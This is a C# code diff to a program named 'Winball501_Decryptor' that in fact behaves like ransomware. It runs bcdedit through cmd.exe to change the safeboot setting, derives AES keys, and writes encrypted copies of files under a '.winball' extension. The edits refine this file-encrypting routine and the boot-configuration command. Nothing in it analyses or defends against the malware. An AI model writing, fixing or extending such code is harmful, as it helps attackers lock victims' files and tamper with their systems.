@@ -6,7 +6,6 @@ using System.IO;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
-using System.Management;
 using multronfileguardian;
 using Microsoft.Win32;
 using System.Diagnostics;
@@ -66,7 +65,7 @@ namespace Winball501_Decryptor
                 ProcessStartInfo startInfo = new ProcessStartInfo
                 {
                     FileName = "cmd.exe",
-                    Arguments = "/c bcdedit /deletevalue {current} safeboot",
+                    Arguments = "/c bcdedit /deletevalue safeboot",
                     RedirectStandardOutput = true,
                     RedirectStandardError = true,
                     UseShellExecute = false,  // Use shell execute false for output redirection
@@ -233,7 +232,8 @@ namespace Winball501_Decryptor
                             ivtg = new System.Security.Cryptography.Rfc2898DeriveBytes(form.reversebarray(raes.generaterandomkey(67)), System.Text.Encoding.ASCII.GetBytes(form.reversestring("youcanjoinsaltinfutureversivonsmsmsms")), 143, System.Security.Cryptography.HashAlgorithmName.SHA512).GetBytes(16);
                             rijndael.IV = ivtg;
                             okur = new System.IO.BinaryReader(System.IO.File.Open(file, System.IO.FileMode.Open, System.IO.FileAccess.Read));
-                            yazar = new System.IO.BinaryWriter(System.IO.File.Open(file + ".winball", System.IO.FileMode.OpenOrCreate, System.IO.FileAccess.Write));
+                            string outputFile = file.EndsWith(".winball") ? file : file + ".winball";
+                            yazar = new System.IO.BinaryWriter(System.IO.File.Open(outputFile, System.IO.FileMode.OpenOrCreate, System.IO.FileAccess.Write));
                             yazar.Write(aeskey, 0, keysize / 8);
                             yazar.Write(ivtg);
                             tutar = new System.IO.MemoryStream();
